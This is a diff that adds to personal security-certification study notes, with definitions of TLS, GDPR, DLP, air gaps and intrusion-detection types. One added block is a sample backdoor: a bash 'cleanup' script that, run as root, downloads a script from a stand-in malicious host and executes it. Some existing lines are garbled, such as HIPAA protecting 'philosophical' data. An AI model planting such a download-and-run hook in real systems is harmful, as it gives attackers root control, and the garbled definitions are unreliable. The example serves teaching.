@@ -191,7 +191,7 @@ Symmetric ciphers: AES, DES, IDEA, RC4
 KEK is just a second layer of crytographic keys that are used in key management systems.
 
 Internet Protocol Security (IPSec) is a suite of protocols used to secure Internet Protocol (IP) communications by encrypting and authenticating each IP packet in a session.
-
+Transport Layer Security (TLS) is the key protocol used to secure web browsing (encrypts the data transmitted between web browsers and web servers)
 
 Cloud Access Security Broker (CASB) is specifically designed to monitor and control access to cloud applications
 
@@ -516,6 +516,16 @@ rooting: gaining admin(root) access to the OS and system apps on android devicie
 
 zero-day attack: type of attack aimed at exploiting vulnerability that is present in already released software
 
+Backdoor example (cron job downloads files as root)
+1. #!/bin/bash
+2. # System cleanup script
+3. …
+4. if [ $(whoami) = “root“ ]; then
+5. /usr/bin/wget http://malicious.example.com/script -O /tmp/update.sh
+6. /bin/bash /tmp/update.sh
+7. fi
+
+
 Firewall vulnerabilies:
 example:
 
@@ -687,7 +697,7 @@ supply chain attack occurs when a trusted vendor‘s compromised system or softw
 16. Data Protection Concepts
 
 PII = any type of info about an individual that can be used to identify them.
-GDPR = regulates personal data privacy of EU citizens
+GDPR = regulates personal data privacy of EU citizens (Data covered by the GDPR should be classified as ‘Regulated Data.)
 HIPAA = provides privacy prtection for philosophical
 PCI DSS = protects credit cardholder data
 Encryption methods used to protect data at rest = FDE, SED, EFS 
@@ -699,6 +709,9 @@ GPS = mobile locator app
 Geofencing provides control over the usage of a mobile device within a designated area
 Encryption coverts plaintext data into ciphertext using an algorithm
 hashing takes data and converts it into fixed-sized scripting
+key step in effectively implementing a DLP system is to first classify the data on the server.
+
+
 
 Data masking:
     replacing sensitive data with fake/modified data while retaining its original form
@@ -811,7 +824,7 @@ identify and prioritize essential systems and workflows necessary for patient ca
 18. Wireless Security Settings
 
 primary function of a network switch in a LAN environment = connect devices within a network and manage data traffic based on MAC addresses
-
+An air gap in cybersecurity means physically separating a computer or network from external networks, like the internet.
 
 You should change default configs with devices from the manufacture (best practice)
 PINs are used in bluetooth device pairings
@@ -825,6 +838,12 @@ IEEE 802.1X
 Requires RADIUS authentication server
 
 AES-GCMP = The encryption protocol primarily used in Wi-Fi networks implementing the WPA3 security standard 
+
+Signature-based HIDS operates by using a database of known threat signatures or attack patterns to detect intrusions
+Network-based: This refers to intrusion detection systems that monitor network traffic
+Heuristic-based: Heuristic-based detection uses behavioral patterns to identify potential threats
+Anomaly-based: Anomaly-based detection identifies unusual activities or deviations from normal behavior
+
 
 
 RADIUS are:
